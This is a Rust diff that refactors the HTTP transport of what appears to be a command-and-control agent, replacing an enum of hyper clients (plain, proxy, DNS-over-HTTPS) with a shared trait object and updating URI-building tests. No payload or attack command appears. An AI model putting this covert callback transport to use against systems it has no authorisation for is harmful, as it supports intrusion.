@@ -5,7 +5,7 @@ use hyper::body::HttpBody;
 use hyper::StatusCode;
 use pb::{c2::*, config::Config};
 use prost::Message;
-use std::sync::mpsc::{Receiver, Sender};
+use std::sync::{mpsc::{Receiver, Sender}, Arc};
 
 #[cfg(feature = "doh")]
 use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};
@@ -107,39 +107,51 @@ where
     pb::xchacha::decode_with_chacha::<Req, Resp>(data)
 }
 
-/// Enum to support different HTTP client connector configurations
-#[derive(Clone)]
-enum HttpClientInner {
-    Plain(hyper::Client<hyper::client::HttpConnector>),
-    Proxy(hyper::Client<hyper_proxy::ProxyConnector<hyper::client::HttpConnector>>),
-    #[cfg(feature = "doh")]
-    Doh(hyper::Client<hyper::client::HttpConnector<HickoryResolverService>>),
-    #[cfg(feature = "doh")]
-    DohProxy(
-        hyper::Client<
-            hyper_proxy::ProxyConnector<hyper::client::HttpConnector<HickoryResolverService>>,
+/// Trait for making HTTP requests, abstracting over different connector types
+trait HttpClient: Send + Sync {
+    fn request(
+        &self,
+        req: hyper::Request<hyper::Body>,
+    ) -> std::pin::Pin<
+        Box<
+            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
+                + Send
+                + '_,
         >,
-    ),
+    >;
 }
 
-impl std::fmt::Debug for HttpClientInner {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self {
-            HttpClientInner::Plain(_) => f.write_str("HttpClientInner::Plain"),
-            HttpClientInner::Proxy(_) => f.write_str("HttpClientInner::Proxy"),
-            #[cfg(feature = "doh")]
-            HttpClientInner::Doh(_) => f.write_str("HttpClientInner::Doh"),
-            #[cfg(feature = "doh")]
-            HttpClientInner::DohProxy(_) => f.write_str("HttpClientInner::DohProxy"),
-        }
+impl<C> HttpClient for hyper::Client<C>
+where
+    C: hyper::client::connect::Connect + Clone + Send + Sync + 'static,
+{
+    fn request(
+        &self,
+        req: hyper::Request<hyper::Body>,
+    ) -> std::pin::Pin<
+        Box<
+            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
+                + Send
+                + '_,
+        >,
+    > {
+        Box::pin(self.request(req))
     }
 }
 
 #[allow(clippy::upper_case_acronyms)]
-#[derive(Debug, Clone)]
+#[derive(Clone)]
 pub struct HTTP {
-    client: HttpClientInner,
+    client: Arc<dyn HttpClient>,
     base_url: String,
+}
+
+impl std::fmt::Debug for HTTP {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("HTTP")
+            .field("base_url", &self.base_url)
+            .finish_non_exhaustive()
+    }
 }
 
 impl HTTP {
@@ -162,15 +174,11 @@ impl HTTP {
         &self,
         req: hyper::Request<hyper::Body>,
     ) -> Result<hyper::Response<hyper::Body>> {
-        let response = match &self.client {
-            HttpClientInner::Plain(client) => client.request(req).await,
-            HttpClientInner::Proxy(client) => client.request(req).await,
-            #[cfg(feature = "doh")]
-            HttpClientInner::Doh(client) => client.request(req).await,
-            #[cfg(feature = "doh")]
-            HttpClientInner::DohProxy(client) => client.request(req).await,
-        }
-        .map_err(|e| anyhow::anyhow!("HTTP request failed: {}", e))?;
+        let response = self
+            .client
+            .request(req)
+            .await
+            .map_err(|e| anyhow::anyhow!("HTTP request failed: {}", e))?;
 
         if response.status() != StatusCode::OK {
             return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
@@ -342,7 +350,7 @@ impl Transport for HTTP {
         connector.set_nodelay(true);
         let client = hyper::Client::builder().build(connector);
         HTTP {
-            client: HttpClientInner::Plain(client),
+            client: Arc::new(client),
             base_url: String::new(),
         }
     }
@@ -379,7 +387,7 @@ impl Transport for HTTP {
         http.set_nodelay(true); // TCP optimization
 
         // Build the appropriate client based on configuration
-        let client = match proxy_uri {
+        let client: Arc<dyn HttpClient> = match proxy_uri {
             Some(proxy_uri_string) => {
                 // Create proxy connector
                 let proxy = hyper_proxy::Proxy::new(
@@ -390,32 +398,12 @@ impl Transport for HTTP {
                 proxy_connector.set_tls(None);
 
                 // Build client with proxy
-                let client = hyper::Client::builder().build(proxy_connector);
-
-                #[cfg(feature = "doh")]
-                {
-                    // When DOH feature is enabled, always use DohProxy variant
-                    // (either with DOH provider or system DNS via HickoryResolverService)
-                    HttpClientInner::DohProxy(client)
-                }
-
-                #[cfg(not(feature = "doh"))]
-                HttpClientInner::Proxy(client)
+                Arc::new(hyper::Client::builder().build(proxy_connector))
             }
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => {
                 // No proxy configuration
-                let client = hyper::Client::builder().build(http);
-
-                #[cfg(feature = "doh")]
-                {
-                    // When DOH feature is enabled, always use Doh variant
-                    // (either with DOH provider or system DNS via HickoryResolverService)
-                    HttpClientInner::Doh(client)
-                }
-
-                #[cfg(not(feature = "doh"))]
-                HttpClientInner::Plain(client)
+                Arc::new(hyper::Client::builder().build(http))
             }
         };
 
@@ -722,7 +710,7 @@ mod tests {
         #[test]
         fn test_build_uri_success() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -733,7 +721,7 @@ mod tests {
         #[test]
         fn test_build_uri_with_trailing_slash() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080/".to_string(),
             };
 
@@ -744,7 +732,7 @@ mod tests {
         #[test]
         fn test_build_uri_without_leading_slash() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -755,7 +743,7 @@ mod tests {
         #[test]
         fn test_build_uri_invalid() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "not a valid url".to_string(),
             };
 
@@ -766,7 +754,7 @@ mod tests {
         #[test]
         fn test_request_builder_headers_and_method() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost".to_string(),
             };
 
@@ -786,7 +774,7 @@ mod tests {
         #[test]
         fn test_request_builder_uri() {
             let http = HTTP {
-                client: HttpClientInner::Plain(hyper::Client::new()),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://example.com".to_string(),
             };
 
